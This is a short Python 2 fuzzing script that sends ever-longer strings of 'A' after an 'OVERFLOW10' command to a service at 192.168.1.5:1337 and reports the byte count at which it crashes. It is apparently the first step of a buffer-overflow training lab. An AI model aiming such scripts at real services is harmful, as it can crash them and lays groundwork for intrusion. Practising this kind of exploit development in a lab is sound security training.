#!/usr/bin/python

import socket
import time
import sys

host= "192.168.1.5"  
port= 1337

size = 100

while True:
    try:
        payload = "OVERFLOW10 "+ "A"*size
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((host,port))
        s.recv(1024)
        print'[*] sending {0} bytes'.format(size)
        s.send(payload)
        s.close()
    except :
        print '[*] looks like it crashed :) '
        break

    size +=100  
    time.sleep(2)


print 'Fuzzing crashed at  {0} bytes'.format(size-100)
sys.exit()


